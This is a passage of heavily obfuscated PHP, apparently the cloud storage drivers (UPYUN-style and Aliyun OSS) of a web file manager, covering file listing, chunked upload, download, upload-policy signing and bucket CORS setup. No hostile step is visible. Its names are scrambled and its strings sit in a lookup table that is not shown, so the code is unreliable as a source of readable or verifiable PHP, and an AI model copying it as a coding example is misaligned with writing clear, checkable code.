$this->fileList($¿ìùºÊ›, $ãçÊ™Ä˚, $ñ¥†˙ŒÕ, !0); $this->listItemCache = !0; foreach ($ñ¥†˙ŒÕ as $§⁄Âπì“) { $˛∞∏à»ı = $this->ussRequest($§⁄Âπì“[$≈‚ÒäâÜ[32]], $≈‚ÒäâÜ[1437]); if (!$˛∞∏à»ı[$≈‚ÒäâÜ[1165]]) { return !1; } } foreach ($ãçÊ™Ä˚ as $˚ﬂç¨…„) { $˛∞∏à»ı = $this->ussRequest($˚ﬂç¨…„, $≈‚ÒäâÜ[1437]); if (!$˛∞∏à»ı[$≈‚ÒäâÜ[1165]]) { return !1; } } $˛∞∏à»ı = $this->ussRequest($¿ìùºÊ›, $≈‚ÒäâÜ[1437]); return $˛∞∏à»ı[$≈‚ÒäâÜ[1165]]; } public function rename($›∫≤ÁÂØ, $ƒ√ã‚˙Ó) { if ($this->isFile($›∫≤ÁÂØ)) { $ƒ√ã‚˙Ó = get_path_father($›∫≤ÁÂØ) . $ƒ√ã‚˙Ó; return $this->moveFile($›∫≤ÁÂØ, $ƒ√ã‚˙Ó); } return $this->renameObject($›∫≤ÁÂØ, $ƒ√ã‚˙Ó); } public function fileInfo($∑âÅÂÑÁ, $ã◊ç“®ä = false, $˘ ûÖ±¶ = array()) { $§…ÏÜŸ∑ =& $_SERVER[ëæªã÷]; $π≈¿˙Æ˜ = array($§…ÏÜŸ∑[32] => $this->pathThis($∑âÅÂÑÁ), $§…ÏÜŸ∑[88] => $this->getPathOuter($§…ÏÜŸ∑[8] . $∑âÅÂÑÁ), $§…ÏÜŸ∑[33] => $§…ÏÜŸ∑[202], $§…ÏÜŸ∑[90] => isset($˘ ûÖ±¶[$§…ÏÜŸ∑[90]]) ? $˘ ûÖ±¶[$§…ÏÜŸ∑[90]] : 0, $§…ÏÜŸ∑[177] => $this->ext($∑âÅÂÑÁ)); if ($ã◊ç“®ä) { return $π≈¿˙Æ˜; } $π≈¿˙Æ˜[$§…ÏÜŸ∑[203]] = $π≈¿˙Æ˜[$§…ÏÜŸ∑[96]] = 0; $π≈¿˙Æ˜[$§…ÏÜŸ∑[204]] = $π≈¿˙Æ˜[$§…ÏÜŸ∑[205]] = !0; if (empty($˘ ûÖ±¶)) { $˘ ûÖ±¶ = $this->objectMeta($∑âÅÂÑÁ); if (!$˘ ûÖ±¶) { return $π≈¿˙Æ˜; } } $π≈¿˙Æ˜[$§…ÏÜŸ∑[203]] = intval($˘ ûÖ±¶[$§…ÏÜŸ∑[1438]]); $π≈¿˙Æ˜[$§…ÏÜŸ∑[96]] = intval($˘ ûÖ±¶[$§…ÏÜŸ∑[1439]]); $π≈¿˙Æ˜[$§…ÏÜŸ∑[90]] = $˘ ûÖ±¶[$§…ÏÜŸ∑[90]]; return $π≈¿˙Æ˜; } public function folderInfo($øÑ≈±˘Œ, $…ªÚ¡®¯ = false) { $ä‚≈§Ÿë =& $_SERVER[ëæªã÷]; $†∆Ìªìú = array($ä‚≈§Ÿë[32] => $this->pathThis($øÑ≈±˘Œ), $ä‚≈§Ÿë[88] => $this->getPathOuter($ä‚≈§Ÿë[8] . $øÑ≈±˘Œ), $ä‚≈§Ÿë[33] => $ä‚≈§Ÿë[89]); if ($…ªÚ¡®¯) { return $†∆Ìªìú; } $†∆Ìªìú[$ä‚≈§Ÿë[203]] = $†∆Ìªìú[$ä‚≈§Ÿë[96]] = 0; $†∆Ìªìú[$ä‚≈§Ÿë[204]] = $†∆Ìªìú[$ä‚≈§Ÿë[205]] = !0; if (empty($ç˜ÌØ¯â)) { $ç˜ÌØ¯â = $this->objectMeta($øÑ≈±˘Œ); if (!$ç˜ÌØ¯â) { return $†∆Ìªìú; } } $†∆Ìªìú[$ä‚≈§Ÿë[203]] = intval($ç˜ÌØ¯â[$ä‚≈§Ÿë[1438]]); $†∆Ìªìú[$ä‚≈§Ÿë[96]] = intval($ç˜ÌØ¯â[$ä‚≈§Ÿë[1439]]); return $†∆Ìªìú; } private function listObjs($…˜Ä≠®Ù, $ΩﬂΩæˆ‡ = 0, $ﬂ⁄†î∂• = 1000) { $õ’¯ëîé =& $_SERVER[ëæªã÷]; $˚Úéè… = array($õ’¯ëîé[1440], $õ’¯ëîé[1441] . $ﬂ⁄†î∂•); if ($ΩﬂΩæˆ‡) { $˚Úéè…[] = $õ’¯ëîé[1442] . $ΩﬂΩæˆ‡; } $≤ãÓóÙ÷ = $this->ussRequest($…˜Ä≠®Ù, $õ’¯ëîé[235], !1, $˚Úéè…); return !$≤ãÓóÙ÷[$õ’¯ëîé[1165]] ? !1 : $≤ãÓóÙ÷[$õ’¯ëîé[1167]]; } private function fileList($øó—Ü¶∏, &$òóŸÃ¶¨, &$ãﬂ–æê€, $øÓÇﬁÆí = false) { $¬íØƒ¸¥ =& $_SERVER[ëæªã÷]; $Û√•–‘• = $¬íØƒ¸¥[12]; $¬”ß”ıÌ = 1000; $Á∏ü‰˘∑ = rtrim($øó—Ü¶∏, $¬íØƒ¸¥[8]) . $¬íØƒ¸¥[8]; $Îé‚‹’√ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $îå—‚ˆ€ = $this->listObjs($øó—Ü¶∏, $Û√•–‘•, $¬”ß”ıÌ); if (!$îå—‚ˆ€) { return !1; } $Û√•–‘• = isset($îå—‚ˆ€[$¬íØƒ¸¥[1443]]) ? $îå—‚ˆ€[$¬íØƒ¸¥[1443]] : $¬íØƒ¸¥[12]; $ãíÅ∫Ø‡ = isset($îå—‚ˆ€[$¬íØƒ¸¥[1444]]) ? $îå—‚ˆ€[$¬íØƒ¸¥[1444]] : array(); foreach ($ãíÅ∫Ø‡ as $Ω¡¨›’Û) { $ﬁﬁÒ“È¿ = $Ω¡¨›’Û[$¬íØƒ¸¥[33]] == $¬íØƒ¸¥[89] ? !0 : !1; $Ç˛ıê¡— = ltrim($Á∏ü‰˘∑ . $Ω¡¨›’Û[$¬íØƒ¸¥[32]], $¬íØƒ¸¥[8]) . ($ﬁﬁÒ“È¿ ? $¬íØƒ¸¥[8] : $¬íØƒ¸¥[12]); $Ω®–Ñ‹à = array($¬íØƒ¸¥[32] => $Ç˛ıê¡—, $¬íØƒ¸¥[33] => $ﬁﬁÒ“È¿ ? $¬íØƒ¸¥[89] : $¬íØƒ¸¥[202], $¬íØƒ¸¥[90] => $Ω¡¨›’Û[$¬íØƒ¸¥[341]], $¬íØƒ¸¥[1439] => $Ω¡¨›’Û[$¬íØƒ¸¥[1445]]); if ($Îé‚‹’√) { $this->cacheMethod($¬íØƒ¸¥[208], $Ç˛ıê¡—, $ﬁﬁÒ“È¿); $this->cacheMethod($¬íØƒ¸¥[209], $Ç˛ıê¡—, $Ω®–Ñ‹à); } if ($ﬁﬁÒ“È¿) { $òóŸÃ¶¨[] = $Ç˛ıê¡—; if ($øÓÇﬁÆí) { $this->fileList($Ç˛ıê¡—, $òóŸÃ¶¨, $ãﬂ–æê€, $øÓÇﬁÆí); } continue; } $ãﬂ–æê€[] = $Ω®–Ñ‹à; } if (count($ãíÅ∫Ø‡) < $¬”ß”ıÌ) { break; } } if ($Îé‚‹’√) { $this->cacheMethod($¬íØƒ¸¥[208], $øó—Ü¶∏, !0); } } public function listPath($˙≥ª∑àƒ, $ˆ¿·∏¡à = false) { $Ì«˚˙Âã =& $_SERVER[ëæªã÷]; $˛∞•õçﬁ = $à§ëÿ®√ = array(); $this->fileList($˙≥ª∑àƒ, $˛∞•õçﬁ, $à§ëÿ®√); foreach ($˛∞•õçﬁ as $è∑‘Ë»Ë => $Í˙ùÒîπ) { $˛∞•õçﬁ[$è∑‘Ë»Ë] = $this->folderInfo($Í˙ùÒîπ, $ˆ¿·∏¡à); } foreach ($à§ëÿ®√ as $è∑‘Ë»Ë => $Í˙ùÒîπ) { $à§ëÿ®√[$è∑‘Ë»Ë] = $this->fileInfo($Í˙ùÒîπ[$Ì«˚˙Âã[32]], $ˆ¿·∏¡à, $Í˙ùÒîπ); } return array($Ì«˚˙Âã[87] => $˛∞•õçﬁ, $Ì«˚˙Âã[86] => $à§ëÿ®√); } public function has($îä˝°Ó«, $ÿ¯Ω†¥¥ = false, $è“¶º’í = true) { $¥îô≠´Ω =& $_SERVER[ëæªã÷]; $ø«Æé’¬ = $¥îô≠´Ω[12]; $èâ∆œ•‡ = 500; $˙Ÿ∂Ò‘ï = 0; $£ÛÓ¶ƒ = 0; $∞≠È√öı = rtrim($îä˝°Ó«, $¥îô≠´Ω[8]) . $¥îô≠´Ω[8]; while (!0) { check_abort(); $ëµª›‡Ø = $this->listObjs($îä˝°Ó«, $ø«Æé’¬, $èâ∆œ•‡); if (!$ëµª›‡Ø) { return !1; } $ø«Æé’¬ = isset($ëµª›‡Ø[$¥îô≠´Ω[1443]]) ? $ëµª›‡Ø[$¥îô≠´Ω[1443]] : $¥îô≠´Ω[12]; $§“∂ »û = isset($ëµª›‡Ø[$¥îô≠´Ω[1444]]) ? $ëµª›‡Ø[$¥îô≠´Ω[1444]] : array(); if (empty($§“∂ »û)) { break; } $Å‘÷âÈÙ = array_filter($§“∂ »û, function ($≈ÓΩË≥ï) { $‡É÷ñÏ› =& $_SERVER[ëæªã÷]; return $≈ÓΩË≥ï[$‡É÷ñÏ›[33]] == $‡É÷ñÏ›[89]; }); $˙ÅÔî›ï = count($§“∂ »û); $Å‘÷âÈÙ = count($Å‘÷âÈÙ); $¬æíéúÂ = $˙ÅÔî›ï - $Å‘÷âÈÙ; if ($ÿ¯Ω†¥¥) { $£ÛÓ¶ƒ += $Å‘÷âÈÙ; $˙Ÿ∂Ò‘ï += $¬æíéúÂ; if ($˙ÅÔî›ï < $èâ∆œ•‡) { break; } continue; } if ($è“¶º’í) { if ($¬æíéúÂ) { return !0; } } else { if ($Å‘÷âÈÙ) { return !0; } } if ($˙ÅÔî›ï < $èâ∆œ•‡) { break; } } if ($ÿ¯Ω†¥¥) { return array($¥îô≠´Ω[212] => $˙Ÿ∂Ò‘ï, $¥îô≠´Ω[213] => $£ÛÓ¶ƒ); } return !1; } public function listAll($ìß™©™í) { $¢®äó„⁄ =& $_SERVER[ëæªã÷]; $ï∏∞†‰– = $ñÔ«·Ö = array(); $this->fileList($ìß™©™í, $ï∏∞†‰–, $ñÔ«·Ö, !0); $√øã˜™— = array(); foreach ($ñÔ«·Ö as $û‘Ö±Èˆ) { $√øã˜™—[$û‘Ö±Èˆ[$¢®äó„⁄[32]]] = $û‘Ö±Èˆ[$¢®äó„⁄[90]]; } foreach ($ï∏∞†‰– as $û‘Ö±Èˆ) { if (is_string($û‘Ö±Èˆ)) { $√øã˜™—[$û‘Ö±Èˆ] = 0; } } return $this->listAllFiles($ìß™©™í, array_keys($√øã˜™—), $√øã˜™—); } public function canRead($»∑⁄ñõÃ) { return $this->exist($»∑⁄ñõÃ) ? !0 : !1; } public function canWrite($˘‹–÷¶œ) { return $this->exist($˘‹–÷¶œ) ? !0 : !1; } public function getContent($ùΩéΩèÒ) { return $this->fileSubstr($ùΩéΩèÒ, 0, -1); } public function setContent($ÃõÌ´√ì, $âÀ„≥ò¢ = '') { $ñƒ∆÷∏Ä =& $_SERVER[ëæªã÷]; if (!$âÀ„≥ò¢) { $˝◊ï–ô¸ = $this->ussRequest($ÃõÌ´√ì, $ñƒ∆÷∏Ä[231]); return $˝◊ï–ô¸[$ñƒ∆÷∏Ä[1165]]; } $¡ìÿΩ¢√ = $this->tempFile($this->pathThis($ÃõÌ´√ì)); file_put_contents($¡ìÿΩ¢√, $âÀ„≥ò¢); if ($this->upload($ÃõÌ´√ì, $¡ìÿΩ¢√)) { $this->tempFileRemve($¡ìÿΩ¢√); return !0; } return !1; } public function fileSubstr($å°˙Ÿï‹, $º¥–˛ˆÊ, $‰⁄ ·÷Ú) { $ßûü“˙§ =& $_SERVER[ëæªã÷]; if (!($ﬁöù¶Ω˝ = $this->link($å°˙Ÿï‹))) { return !1; } $©∞∆Àî = !1; if ($‰⁄ ·÷Ú > 0) { $≤∆ÖñÕﬁ = $º¥–˛ˆÊ + $‰⁄ ·÷Ú - 1; $©∞∆Àî = array($ßûü“˙§[1406] . $º¥–˛ˆÊ . $ßûü“˙§[460] . $≤∆ÖñÕﬁ); } $‘ıÚ¯™Ò = url_request($ﬁöù¶Ω˝, $ßûü“˙§[235], !1, $©∞∆Àî); return $‘ıÚ¯™Ò[$ßûü“˙§[730]] ? $‘ıÚ¯™Ò[$ßûü“˙§[1167]] : !1; } public function upload($Ÿ¥Á•®ì, $Ò‹∆µØ√, $ä∆°ä∆  = false, $ÉñôÕ∑¸ = REPEAT_REPLACE) { $∞°îá¡— =& $_SERVER[ëæªã÷]; $‰ìˆƒﬂì = IO::size($Ò‹∆µØ√); if ($‰ìˆƒﬂì <= 1024 * 1024 * 200) { $óˆóå±˚ = array($∞°îá¡—[1446] . $Ò‹∆µØ√); $ÿÄ“˚¡ë = $this->ussRequest($Ÿ¥Á•®ì, $∞°îá¡—[233], $óˆóå±˚); return $ÿÄ“˚¡ë[$∞°îá¡—[1165]] ? $this->getPathOuter($Ÿ¥Á•®ì) : !1; } $†ïÍ£ƒç = 1024 * 1024 * 10; $‰ã≥ã≥µ = array($∞°îá¡—[1447], $∞°îá¡—[1448] . $‰ìˆƒﬂì, $∞°îá¡—[1449], $∞°îá¡—[1450] . $†ïÍ£ƒç); $ÿÄ“˚¡ë = $this->ussRequest($Ÿ¥Á•®ì, $∞°îá¡—[233], !1, $‰ã≥ã≥µ); if (!$ÿÄ“˚¡ë[$∞°îá¡—[1165]]) { return !1; } $¬‡•˚ÅÂ = $ÿÄ“˚¡ë[$∞°îá¡—[1167]]; $„‚Ø≥´± = 0; $îÕï©∑÷ = $¬‡•˚ÅÂ[$∞°îá¡—[1451]]; $ÓÖó∫…ë = fopen($Ò‹∆µØ√, $∞°îá¡—[1355]); if (!$ÓÖó∫…ë) { return !1; } do { $¢ı©™Ç¢ = $¬‡•˚ÅÂ[$∞°îá¡—[1452]]; fseek_64($ÓÖó∫…ë, $„‚Ø≥´±); $Û»íÀûú = fread($ÓÖó∫…ë, $¢ı©™Ç¢); $øÊÀ∑∂Æ = 0; do { $øÊÀ∑∂Æ++; $¬‡•˚ÅÂ = $this->uploadPart($Ÿ¥Á•®ì, $¬‡•˚ÅÂ, $Û»íÀûú); } while (!$¬‡•˚ÅÂ && $øÊÀ∑∂Æ < 3); if (!$¬‡•˚ÅÂ) { return !1; } $îÕï©∑÷ = $¬‡•˚ÅÂ[$∞°îá¡—[1451]]; $„‚Ø≥´± += $¢ı©™Ç¢; } while ($îÕï©∑÷ != -1); fclose($ÓÖó∫…ë); $‰ã≥ã≥µ = array($∞°îá¡—[1453], $∞°îá¡—[1454] . $¬‡•˚ÅÂ[$∞°îá¡—[1455]], $∞°îá¡—[1449]); $ÿÄ“˚¡ë = $this->ussRequest($Ÿ¥Á•®ì, $∞°îá¡—[233], !1, $‰ã≥ã≥µ); return $ÿÄ“˚¡ë[$∞°îá¡—[1165]] ? $this->getPathOuter($ê›…Ÿß) : !1; } private function uploadPart($Õ˚Ñõ®ï, $˚‚¡ì˝÷, &$»¥Èñ–´) { $ä˝ºì˘ =& $_SERVER[ëæªã÷]; $éø±è»ô = array($ä˝ºì˘[1456], $ä˝ºì˘[1454] . $˚‚¡ì˝÷[$ä˝ºì˘[1455]], $ä˝ºì˘[1457] . $˚‚¡ì˝÷[$ä˝ºì˘[1451]], $ä˝ºì˘[149] . $˚‚¡ì˝÷[$ä˝ºì˘[1452]]); $æè±ÉÕˆ = $this->ussRequest($Õ˚Ñõ®ï, $ä˝ºì˘[233], $»¥Èñ–´, $éø±è»ô); return !$æè±ÉÕˆ[$ä˝ºì˘[1165]] ? $æè±ÉÕˆ[$ä˝ºì˘[1165]] : $æè±ÉÕˆ[$ä˝ºì˘[1167]]; } public function uploadFormData($¨Ä˛È™¬, $˚˛ÆûºÎ = 3600) { return $this->uploadPolicy($¨Ä˛È™¬, $˚˛ÆûºÎ); } public function multiUploadFormData($≥˜˘ï≤´, $ô‹Ï√Á… = 3600) { $ç•¡≈ÛÖ =& $_SERVER[ëæªã÷]; $ÙÑ—©·“ = (int) $GLOBALS[$ç•¡≈ÛÖ[7]][$ç•¡≈ÛÖ[90]]; return $this->uploadPolicy($≥˜˘ï≤´, $ô‹Ï√Á…, $ÙÑ—©·“); } private function uploadPolicy($è≥âù§Ò, $úﬁ¿†èﬂ = 3600, $Ã≠∂ ´‚ = 0) { $ﬂ´«¯˜ï =& $_SERVER[ëæªã÷]; $∆µ˛‰’‘ = $ﬂ´«¯˜ï[8] . $this->bucket; $˛≠ÍﬂÖà = gmdate($ﬂ´«¯˜ï[1391]); $ç—›Õ¶Û = array($ﬂ´«¯˜ï[1458] => $this->bucket, $ﬂ´«¯˜ï[1459] => $è≥âù§Ò, $ﬂ´«¯˜ï[1460] => time() + $úﬁ¿†èﬂ, $ﬂ´«¯˜ï[1461] => $˛≠ÍﬂÖà); if ($Ã≠∂ ´‚) { $ç—›Õ¶Û[$ﬂ´«¯˜ï[1371]] = $Ã≠∂ ´‚; } $∂ØÓπ¢Å = base64_encode(json_encode($ç—›Õ¶Û)); $Ì»∫´ÈÆ = base64_encode(hash_hmac($ﬂ´«¯˜ï[1428], "\120\117\x53\x54\x26{$∆µ˛‰’‘}\46{$˛≠ÍﬂÖà}\46{$∂ØÓπ¢Å}", md5("{$this->userpass}"), !0)); $µ∆È ™Ì = array($ﬂ´«¯˜ï[1296] => $∂ØÓπ¢Å, $ﬂ´«¯˜ï[1462] => "\125\x50\x59\125\x4e\40{$this->username}\72{$Ì»∫´ÈÆ}", $ﬂ´«¯˜ï[184] => $this->endpoint . $∆µ˛‰’‘); return $µ∆È ™Ì; } public function download($≈¸”·≈†, $•˝ø‘˘œ) { $ê´…´˘∞ = IO::getPathInner(IO::mkfile($•˝ø‘˘œ)); if (!($¿†»–ﬁê = $this->link($≈¸”·≈†))) { return !1; } $±€•üˆ™ = 0; $ò‹í˛˘ß = 1024 * 200; $‚º‰˙Æå = fopen($ê´…´˘∞, $_SERVER[ëæªã÷][1412]); while (!0) { $¯≤˜Œ“ = $this->fileSubstr($≈¸”·≈†, $±€•üˆ™, $ò‹í˛˘ß); if ($¯≤˜Œ“ === !1) { return !1; } fwrite($‚º‰˙Æå, $¯≤˜Œ“); $±€•üˆ™ += $ò‹í˛˘ß; if (strlen($¯≤˜Œ“) < $ò‹í˛˘ß) { break; } } fclose($‚º‰˙Æå); return $•˝ø‘˘œ; } public function link($Ù◊Ÿ°Á≈, $˙Ê ıìÛ = array()) { $¯Û„ØÊ˙ =& $_SERVER[ëæªã÷]; $Ù◊Ÿ°Á≈ = trim($Ù◊Ÿ°Á≈, $¯Û„ØÊ˙[8]); if (!empty($this->token)) { $Ë“±äí› = strtotime(date($¯Û„ØÊ˙[1463])); $È˚¸¬‰Í = substr(md5($this->token . $¯Û„ØÊ˙[288] . $Ë“±äí› . $¯Û„ØÊ˙[1464] . $Ù◊Ÿ°Á≈), 12, 8) . $Ë“±äí›; $˙Ê ıìÛ[] = $¯Û„ØÊ˙[1465] . $È˚¸¬‰Í; } $óÚÄÌ•⁄ = !empty($˙Ê ıìÛ) ? $¯Û„ØÊ˙[83] . implode($¯Û„ØÊ˙[288], $˙Ê ıìÛ) : $¯Û„ØÊ˙[12]; return $this->getHost() . $¯Û„ØÊ˙[8] . $Ù◊Ÿ°Á≈ . $óÚÄÌ•⁄; } public function fileOut($á„ÔÿÁ», $ÒÕÆ∏ëÚ = false, $ó˙˝ßô = false, $Ç∏—ûÆ◊ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($á„ÔÿÁ», $ÒÕÆ∏ëÚ, $ó˙˝ßô, $Ç∏—ûÆ◊); } if (!$ó˙˝ßô) { $ó˙˝ßô = $this->pathThis($á„ÔÿÁ»); } $Üˆ≥î¶û = $ÒÕÆ∏ëÚ ? array($_SERVER[ëæªã÷][1466] . rawurlencode($ó˙˝ßô)) : array(); $àñ¨äΩõ = $this->link($á„ÔÿÁ», $Üˆ≥î¶û); $this->fileOutLink($àñ¨äΩõ); } public function fileOutServer($¶ ¶áë, $⁄û‚Ê∏∂ = false, $¶ó∆‹Ùá = false, $ò≠î†∞Ó = '') { parent::fileOut($¶ ¶áë, $⁄û‚Ê∏∂, $¶ó∆‹Ùá, $ò≠î†∞Ó); } public function fileOutImage($ß·“É¢Ó, $ñõ∂ÜÕï = 250) { $˚•¯Ù·± = $this->link($ß·“É¢Ó . $_SERVER[ëæªã÷][1467] . $ñõ∂ÜÕï); $this->fileOutLink($˚•¯Ù·±); } public function fileOutImageServer($‘áõåñ´, $ÿõé‚Öï = 250) { parent::fileOutImage($‘áõåñ´, $ÿõé‚Öï); } public function hashMd5($„ˆºôÀı) { $–Ï®àÜÀ =& $_SERVER[ëæªã÷]; $œ˙èÖêí = $this->_objectMeta($„ˆºôÀı); return isset($œ˙èÖêí[$–Ï®àÜÀ[217]]) ? $œ˙èÖêí[$–Ï®àÜÀ[217]] : !1; } public function size($§÷êÕõ˘) { $≤´óôÿ± = $this->objectMeta($§÷êÕõ˘); return $≤´óôÿ± ? $≤´óôÿ±[$_SERVER[ëæªã÷][90]] : 0; } public function info($Í∂âó„) { if ($this->isFolder($Í∂âó„)) { return $this->folderInfo($Í∂âó„); } else { if ($this->isFile($Í∂âó„)) { return $this->fileInfo($Í∂âó„); } } return !1; } public function exist($ÄÂ≠ù÷Ó) { return $this->isFile($ÄÂ≠ù÷Ó) || $this->isFolder($ÄÂ≠ù÷Ó); } public function isFile($≤‡é÷µÛ) { return !$this->isFolder($≤‡é÷µÛ) && $this->objectMeta($≤‡é÷µÛ); } public function isFolder($øàñÄ™ı) { return $this->cacheMethod($_SERVER[ëæªã÷][208], $øàñÄ™ı); } protected function objectMeta($«ËÂ¢€¨) { return $this->cacheMethod($_SERVER[ëæªã÷][209], $«ËÂ¢€¨); } protected function _objectMeta($¿¨‚Ó∑û) { $æ°è†ù› =& $_SERVER[ëæªã÷]; if ($¿¨‚Ó∑û == $æ°è†ù›[12] || $¿¨‚Ó∑û == $æ°è†ù›[8]) { return array(); } $ˆ≥ÊÌÔ¡ = $this->ussRequest($¿¨‚Ó∑û, $æ°è†ù›[1468]); if (!$ˆ≥ÊÌÔ¡[$æ°è†ù›[1165]]) { return null; } $©©ÆüÆÅ = isset($ˆ≥ÊÌÔ¡[$æ°è†ù›[1167]]) ? $ˆ≥ÊÌÔ¡[$æ°è†ù›[1167]] : array(); if (!isset($©©ÆüÆÅ[$æ°è†ù›[1469]])) { return null; } $÷Ó∏π¯ò = array($æ°è†ù›[33] => isset($©©ÆüÆÅ[$æ°è†ù›[1469]]) ? $©©ÆüÆÅ[$æ°è†ù›[1469]] : null, $æ°è†ù›[90] => isset($©©ÆüÆÅ[$æ°è†ù›[1470]]) ? $©©ÆüÆÅ[$æ°è†ù›[1470]] : null, $æ°è†ù›[217] => isset($©©ÆüÆÅ[$æ°è†ù›[1471]]) ? $©©ÆüÆÅ[$æ°è†ù›[1471]] : null, $æ°è†ù›[1438] => isset($©©ÆüÆÅ[$æ°è†ù›[1472]]) ? $©©ÆüÆÅ[$æ°è†ù›[1472]] : null); $÷Ó∏π¯ò[$æ°è†ù›[1439]] = isset($©©ÆüÆÅ[$æ°è†ù›[1473]]) ? strtotime($©©ÆüÆÅ[$æ°è†ù›[1473]]) : $÷Ó∏π¯ò[$æ°è†ù›[1438]]; return $÷Ó∏π¯ò; } protected function _isFolder($¿∂ÇñÏô) { $’ÓÇÅôÑ =& $_SERVER[ëæªã÷]; if ($¿∂ÇñÏô == $’ÓÇÅôÑ[12] || $¿∂ÇñÏô == $’ÓÇÅôÑ[8]) { return !0; } $Ëπ’Ñ∞Ç = $this->_objectMeta($¿∂ÇñÏô); return isset($Ëπ’Ñ∞Ç[$’ÓÇÅôÑ[33]]) && $Ëπ’Ñ∞Ç[$’ÓÇÅôÑ[33]] == $’ÓÇÅôÑ[89] ? !0 : !1; } } goto FÃÎ™Ç£¥Ú; eﬂ√ÎùÀâ°: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($ÀìÖﬂò¢) { parent::__construct(); include_once SDK_DIR . $_SERVER[ëæªã÷][1356]; $this->_init($ÀìÖﬂò¢); } public function _init($–çÙÁú∫) { $ÒãºÄâ· =& $_SERVER[ëæªã÷]; foreach ($–çÙÁú∫ as $—öî™Ïä => $ªâŸ¥æÿ) { if (isset($this->{$—öî™Ïä})) { $this->{$—öî™Ïä} = $ªâŸ¥æÿ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÒãºÄâ·[1357] . LNG($ÒãºÄâ·[1358])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $üÌ·—»Á =& $_SERVER[ëæªã÷]; $°≥ËÏ˙Ì = new OSS\Model\CorsConfig(); $åÅíƒˆ≤ = new OSS\Model\CorsRule(); $åÅíƒˆ≤->addAllowedOrigin($üÌ·—»Á[1359]); $åÅíƒˆ≤->addAllowedMethod($üÌ·—»Á[1360]); $åÅíƒˆ≤->addAllowedMethod($üÌ·—»Á[1361]); $åÅíƒˆ≤->addAllowedMethod($üÌ·—»Á[1362]); $åÅíƒˆ≤->addAllowedMethod($üÌ·—»Á[1363]); $åÅíƒˆ≤->addAllowedMethod($üÌ·—»Á[167]); $åÅíƒˆ≤->setMaxAgeSeconds(600); $åÅíƒˆ≤->addExposeHeader($üÌ·—»Á[1364]); $åÅíƒˆ≤->addAllowedHeader($üÌ·—»Á[1359]); $°≥ËÏ˙Ì->addRule($åÅíƒˆ≤); try { $this->client->putBucketCors($this->bucket, $°≥ËÏ˙Ì); } catch (OSS\Core\OssException $¬ﬁñà¿û) { return !1; } return !0; } public function getBucketCors() { $û«Öî›¥ =& $_SERVER[ëæªã÷]; $˙≠Áõı¿ = null; try { $˙≠Áõı¿ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $´ô¿¶Â) { return null; } if (!$˙≠Áõı¿ || !($„Ö·ëÎ– = $˙≠Áõı¿->getRules())) { return null; } $†ù··∂Ö = $„Ö·ëÎ–[0]->getAllowedOrigins(); $ü„Ωä¢— = $„Ö·ëÎ–[0]->getAllowedMethods(); $≠àç––Ω = $„Ö·ëÎ–[0]->getMaxAgeSeconds(); $®ËÊáÕ® = $„Ö·ëÎ–[0]->getExposeHeaders(); $Î«ä∑Çè = $„Ö·ëÎ–[0]->getAllowedHeaders(); return array($û«Öî›¥[190] => isset($†ù··∂Ö[0]) ? $†ù··∂Ö[0] : $û«Öî›¥[12], $û«Öî›¥[194] => $ü„Ωä¢—, $û«Öî›¥[1365] => $≠àç––Ω, $û«Öî›¥[1366] => isset($®ËÊáÕ®[0]) ? $®ËÊáÕ®[0] : $û«Öî›¥[12], $û«Öî›¥[192] => isset($Î«ä∑Çè[0]) ? $Î«ä∑Çè[0] : $û«Öî›¥[12]); } public function isBucketCors() { $¡Ω≈ê©– =& $_SERVER[ëæªã÷]; $˝≈–í°Î = $this->getBucketCors(); if (!$˝≈–í°Î || !is_array($˝≈–í°Î)) { return !1; } if ($˝≈–í°Î[$¡Ω≈ê©–[190]] != $¡Ω≈ê©–[191] || $˝≈–í°Î[$¡Ω≈ê©–[192]] != $¡Ω≈ê©–[191]) { return !1; } $®üË’≤ï = array_map($¡Ω≈ê©–[193], $˝≈–í°Î[$¡Ω≈ê©–[194]]); if (!is_array($®üË’≤ï)) { $®üË’≤ï = array(); } $›„ç¢•Á = array($¡Ω≈ê©–[195], $¡Ω≈ê©–[196], $¡Ω≈ê©–[197], $¡Ω≈ê©–[198], $¡Ω≈ê©–[199]); $Ã—åÅâÓ = array_diff($›„ç¢•Á, $®üË’≤ï); return empty($Ã—åÅâÓ); } public function mkfile($˜»Ç±·¯, $áùÅÖöﬁ = '', $˚ıêì÷∂ = REPEAT_RENAME) { $º¸£›â¬ = $this->setContent($˜»Ç±·¯, $áùÅÖöﬁ); if ($º¸£›â¬ !== !1) { return $this->getPathOuter($˜»Ç±·¯); } return !1; } public function mkdir($˛Óﬁöáí, $πá¥ª¥ö = REPEAT_SKIP) { if ($this->_isFolder($˛Óﬁöáí)) { return $this->getPathOuter($˛Óﬁöáí); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($˛Óﬁöáí)); } catch (OSS\Core\OssException $Úû∆Â¿”) { return !1; } return $this->getPathOuter($˛Óﬁöáí); } private function fileList($ñ»≤ÇãØ, $ ⁄∂Ω∆Ú = '', $˜ï“¨üÁ = 0) { $Ù£±ê√ö =& $_SERVER[ëæªã÷]; $ñ»≤ÇãØ = trim($ñ»≤ÇãØ, $Ù£±ê√ö[8]); $…¸§Ñ√Ó = empty($ñ»≤ÇãØ) && $ñ»≤ÇãØ !== $Ù£±ê√ö[200] ? $Ù£±ê√ö[12] : $ñ»≤ÇãØ . $Ù£±ê√ö[8]; $±ò‘Å¿∑ = $Ù£±ê√ö[12]; $˜Ö¯◊¸ˆ = 1000; $§≠¸å∑ƒ = $this->listItemCache === !1 ? !1 : !0; $åÇáìñÜ = $ÑŸ¨Áõˆ = array(); while (!0) { check_abort(); $Ô†·√Ω™ = array($Ù£±ê√ö[1367] => $ ⁄∂Ω∆Ú, $Ù£±ê√ö[1368] => $…¸§Ñ√Ó, $Ù£±ê√ö[1369] => $˜Ö¯◊¸ˆ, $Ù£±ê√ö[1370] => $±ò‘Å¿∑); try { $Ãü∫üÀö = $this->client->listObjects($this->bucket, $Ô†·√Ω™); } catch 